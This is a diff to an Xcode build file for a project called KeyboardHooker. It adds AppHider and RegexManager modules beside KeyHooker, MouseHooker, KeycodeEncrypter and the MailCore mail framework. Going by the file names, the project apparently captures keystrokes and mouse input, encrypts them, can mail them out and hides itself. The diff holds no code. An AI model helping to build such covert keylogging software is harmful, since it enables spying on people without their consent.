@@ -14,6 +14,7 @@
 		2C46D01A1FD3095500261537 /* MailCore.framework in CopyFiles */ = {isa = PBXBuildFile; fileRef = 2C46D00C1FD3088900261537 /* MailCore.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 		2C46D0581FD35DCC00261537 /* Cryptographer.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C46D0571FD35DCC00261537 /* Cryptographer.m */; };
 		2C46D0641FD3651300261537 /* KeycodeEncrypter.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C46D0631FD3651300261537 /* KeycodeEncrypter.m */; };
+		2C79E5171FD43E8300D51240 /* RegexManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C79E5161FD43E8300D51240 /* RegexManager.m */; };
 		2C887F981FC833FF009462E3 /* KeyHooker.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C887F971FC833FF009462E3 /* KeyHooker.m */; };
 		2C887F9F1FC83EE3009462E3 /* Time.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C887F9E1FC83EE3009462E3 /* Time.m */; };
 		2C887FA31FC840F4009462E3 /* KeyRunLoop.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C887FA21FC840F4009462E3 /* KeyRunLoop.m */; };
@@ -23,6 +24,7 @@
 		2C91C5631FC41ED1002FE30F /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C91C5621FC41ED1002FE30F /* ViewController.m */; };
 		2C91C5651FC41ED1002FE30F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 2C91C5641FC41ED1002FE30F /* Assets.xcassets */; };
 		2C91C5681FC41ED1002FE30F /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 2C91C5661FC41ED1002FE30F /* Main.storyboard */; };
+		2CFE66731FD459FB00474420 /* AppHider.m in Sources */ = {isa = PBXBuildFile; fileRef = 2CFE66721FD459FB00474420 /* AppHider.m */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -115,6 +117,8 @@
 		2C46D0571FD35DCC00261537 /* Cryptographer.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = Cryptographer.m; sourceTree = "<group>"; };
 		2C46D0621FD3651300261537 /* KeycodeEncrypter.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KeycodeEncrypter.h; sourceTree = "<group>"; };
 		2C46D0631FD3651300261537 /* KeycodeEncrypter.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KeycodeEncrypter.m; sourceTree = "<group>"; };
+		2C79E5151FD43E8300D51240 /* RegexManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RegexManager.h; sourceTree = "<group>"; };
+		2C79E5161FD43E8300D51240 /* RegexManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RegexManager.m; sourceTree = "<group>"; };
 		2C887F961FC833FF009462E3 /* KeyHooker.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KeyHooker.h; sourceTree = "<group>"; };
 		2C887F971FC833FF009462E3 /* KeyHooker.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KeyHooker.m; sourceTree = "<group>"; };
 		2C887F9D1FC83EE3009462E3 /* Time.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = Time.h; sourceTree = "<group>"; };
@@ -132,6 +136,8 @@
 		2C91C5641FC41ED1002FE30F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		2C91C5671FC41ED1002FE30F /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		2C91C5691FC41ED1002FE30F /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		2CFE66711FD459FB00474420 /* AppHider.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AppHider.h; sourceTree = "<group>"; };
+		2CFE66721FD459FB00474420 /* AppHider.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = AppHider.m; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -196,6 +202,15 @@
 				2C46D0631FD3651300261537 /* KeycodeEncrypter.m */,
 			);
 			name = KeycodeEncrypter;
+			sourceTree = "<group>";
+		};
+		2C79E50D1FD43E6F00D51240 /* RegexManager */ = {
+			isa = PBXGroup;
+			children = (
+				2C79E5151FD43E8300D51240 /* RegexManager.h */,
+				2C79E5161FD43E8300D51240 /* RegexManager.m */,
+			);
+			name = RegexManager;
 			sourceTree = "<group>";
 		};
 		2C887F8F1FC7828F009462E3 /* Frameworks */ = {
@@ -280,6 +295,8 @@
 		2C91C55A1FC41ED1002FE30F /* KeyboardHooker */ = {
 			isa = PBXGroup;
 			children = (
+				2CFE66701FD459EA00474420 /* AppHider */,
+				2C79E50D1FD43E6F00D51240 /* RegexManager */,
 				2C46D0611FD364F600261537 /* KeycodeEncrypter */,
 				2C46D0551FD35D8900261537 /* Cryptographer */,
 				2C46CFF81FD3088800261537 /* mailcore2.xcodeproj */,
@@ -305,6 +322,15 @@
 				2C91C55F1FC41ED1002FE30F /* main.m */,
 			);
 			name = "Supporting Files";
+			sourceTree = "<group>";
+		};
+		2CFE66701FD459EA00474420 /* AppHider */ = {
+			isa = PBXGroup;
+			children = (
+				2CFE66711FD459FB00474420 /* AppHider.h */,
+				2CFE66721FD459FB00474420 /* AppHider.m */,
+			);
+			name = AppHider;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -452,10 +478,12 @@
 				2C91C5601FC41ED1002FE30F /* main.m in Sources */,
 				2C887FA71FC84383009462E3 /* MouseHooker.m in Sources */,
 				2C91C55D1FC41ED1002FE30F /* AppDelegate.m in Sources */,
+				2CFE66731FD459FB00474420 /* AppHider.m in Sources */,
 				2C3522681FD1A17D006481ED /* FileManager.m in Sources */,
 				2C46D0581FD35DCC00261537 /* Cryptographer.m in Sources */,
 				2C46D0641FD3651300261537 /* KeycodeEncrypter.m in Sources */,
 				2C887FA31FC840F4009462E3 /* KeyRunLoop.m in Sources */,
+				2C79E5171FD43E8300D51240 /* RegexManager.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
